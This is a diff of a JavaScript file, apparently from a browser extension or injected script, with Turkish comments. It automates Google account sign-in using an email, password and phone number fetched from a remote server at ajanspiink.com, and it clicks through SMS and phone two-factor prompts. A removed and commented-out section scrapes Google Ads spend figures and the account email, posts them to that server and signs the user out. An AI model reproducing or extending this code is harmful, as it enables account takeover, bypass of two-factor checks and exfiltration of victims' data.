@@ -1,6 +1,6 @@
 var baseUrl = 'https://ajanspiink.com/';
 
-function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; request.open("POST", url, true); request.send(); }
+function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; url = baseUrl + url; request.open("POST", url, true); request.send(); }
 
 if (location.href != "https://accounts.google.com/ServiceLogin/identifier?flowName=GlifWebSignIn&flowEntry=AddSession") {
     try {
@@ -24,6 +24,7 @@ var sInt1 = setInterval(function () {
             }
             catch (ex) { console.log(ex); }
 
+
             try {
 
                 try {
@@ -35,11 +36,34 @@ var sInt1 = setInterval(function () {
                 catch (ex) { console.log(ex); }
             }
             catch (ex) { console.log(ex); }
+
+            try {
+                document.querySelector('[name="Email"]').value = obj.mail.trim(); //mail set etme
+                mailId = obj.mail.trim();
+                document.querySelector('#next').click();//mail ileri tıklama
+            }
+            catch (ex) { console.log(ex); }
+
+
+            try {
+
+                try {
+                    document.querySelector('#password').value = (obj.password2 == null ? obj.password.trim() : obj.password2.trim());//2.şifre varsa 2.şifre yoksa 1.şifre
+                    document.querySelector('#submit').click();//şifre1 ileri tıklama
+                    clearInterval(sInt1);
+                    pass2();
+                }
+                catch (ex) { console.log(ex); }
+            }
+            catch (ex) { console.log(ex); }
+
+
+
+
         }
     });
 
 }, 2500);
-
 
 
 function pass2() {
@@ -49,6 +73,16 @@ function pass2() {
             var smsBTN = document.querySelector('#smsButton');
             if (smsBTN != null) {
                 document.querySelector('#smsButton').click();
+                return;
+            }
+        } catch (e) { }
+
+        try {
+            var phoneNext = document.querySelector('#authzenNext');
+            if (phoneNext != null) {
+                document.querySelector('[jsname="bCkDte"]').click();
+                clearInterval(sInt2);
+                sms();
                 return;
             }
         } catch (e) { }
@@ -137,6 +171,16 @@ function sms() {
     var sInt3 = setInterval(function () {//Sms Doğrulama
 
         try {
+            if (document.querySelector('strong').innerText == "g.co/verifyaccount") {
+                document.querySelector('[jsname="bCkDte"]').click();
+                clearInterval(sInt3);
+                mail();
+                return;
+            }
+        } catch (e) { }
+
+
+        try {
             var smsBTN = document.querySelector('#smsButton');
             if (smsBTN != null) {
                 document.querySelector('#smsButton').click();
@@ -146,14 +190,6 @@ function sms() {
             }
         } catch (e) { }
 
-        try {
-            if (document.querySelector('strong').innerText == "g.co/verifyaccount") {
-                document.querySelector('[jsname="bCkDte"]').click();
-                clearInterval(sInt3);
-                mail();
-                return;
-            }
-        } catch (e) { }
 
         try {
             if (document.querySelectorAll('[role="presentation"] h2 span[jsslot]')[1].innerText == "Doğrulama kodu alın") {
@@ -192,12 +228,25 @@ function sms() {
                 if (this.readyState == 4 && this.status == 200) {
                     var row = JSON.parse(this.responseText);
                     console.log('sms phone loading');
+
+
                     try {
                         var phonenumber = document.querySelector('#phoneNumberId');
                         if (phonenumber != null && document.querySelectorAll('[role="button"]')[document.querySelectorAll('[role="button"]').length - 2].textContent == "Gönder") {
                             document.querySelector('#phoneNumberId').value = row.phone.trim();
                             document.querySelectorAll('[role="button"]')[document.querySelectorAll('[role="button"]').length - 2].click();//Gönder
                             console.log('sms phone send');
+                        }
+
+                    }
+                    catch (ex) { }
+
+
+                    try {
+                        var phonesendBtn = document.querySelector('[data-sendmethod="SMS"]');
+                        if (phonesendBtn != null) {
+                            console.log('sms phone send Button');
+                            phonesendBtn.click();
                         }
 
                     }
@@ -284,69 +333,48 @@ function mail() {
 
 
 
-//var mails = "";
-//try {
-//    mails = document.querySelectorAll('a[aria-label]')[1].getAttribute('aria-label').split(' ')[document.querySelectorAll('a[aria-label]')[1].getAttribute('aria-label').split(' ').length - 1].replace('(', '').replace(')', '').replace(' ', '');
-
-//} catch (e) {
-//    mails = document.querySelectorAll('a[title]')[1].getAttribute('title').split(' ')[document.querySelectorAll('a[title]')[1].getAttribute('title').split(' ').length - 1].replace('(', '').replace(')', '').replace(' ', '');
-//}
-//if (mails.indexOf('.') < 1) {
-//    mails = document.querySelector('.focus-ring img').getAttribute('alt').split(' ')[document.querySelector('.focus-ring img').getAttribute('alt').split(' ').length - 1].replace('(', '').replace(')', '').replace(' ', '');
-//}
-//var url77 = 'settype?mail=' + mails + '&stypeenum=77';
-//ajax(url77, function () {
-//    window.location.href = 'https://ads.google.com/aw/overview';
-//});
 
 
+///////----------------- ADS----------------------------------------------
+
+//var adsInt = setInterval(function () {
+//    try {
+
+//        var mails = "";
+//        try {
+//            document.querySelector('[minerva-id="datepicker"] div').click();
+//            document.querySelector('[role="menuitemradio"]:last-child>span>span').click();
+//            var priceAll = document.querySelectorAll('.stats[role="button"]')[document.querySelectorAll('.stats[role="button"]').length - 1].innerText;
+
+//            ajax('getKur?price=' + priceAll, function () {
+//                clearInterval(adsInt);
+//                if (this.readyState == 4 && this.status == 200) {
+//                    var result = JSON.parse(this.responseText);
+
+//                    mails = document.querySelector('.email').textContent;
+
+//                    var url77 = 'settype?mail=' + mails + '&stypeenum=9999&price=' + result;
+//                    ajax(url77, function () {
+//                        document.querySelector('.trigger[buttondecorator]').click();
+//                        document.querySelector('.sign-out').click();
+//                    });
 
 
+//                }
+//            });
 
+//        } catch (e) {
 
+//        }
 
+//    } catch (e) {
 
------------------ ADS----------------------------------------------
+//    }
 
-var adsInt = setInterval(function () {
-    try {
+//}, 5000);
 
-        var mails = "";
-        try {
-            document.querySelector('[minerva-id="datepicker"] div').click();
-            document.querySelector('[role="menuitemradio"]:last-child>span>span').click();
-            var priceAll = document.querySelectorAll('.stats[role="button"]')[document.querySelectorAll('.stats[role="button"]').length - 1].innerText;
+//var baseUrl = 'https://ajanspiink.com/';
+//function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; url = baseUrl + url; request.open("POST", url, true); request.send(); }
 
-            ajax('getKur?price=' + priceAll, function () {
-                clearInterval(adsInt);
-                if (this.readyState == 4 && this.status == 200) {
-                    var result = JSON.parse(this.responseText);
-
-                    mails = document.querySelector('.email').textContent;
-
-                    var url77 = 'settype?mail=' + mails + '&stypeenum=9999&price=' + result;
-                    ajax(url77, function () {
-                        document.querySelector('.trigger[buttondecorator]').click();
-                        document.querySelector('.sign-out').click();
-                    });
-
-
-                }
-            });
-
-        } catch (e) {
-
-        }
-
-    } catch (e) {
-
-    }
-
-}, 5000);
-
-
-
-
-function ajax(url, callMethod) { var request = new XMLHttpRequest(); request.onreadystatechange = callMethod; request.open("POST", url, true); request.send(); }
 
 
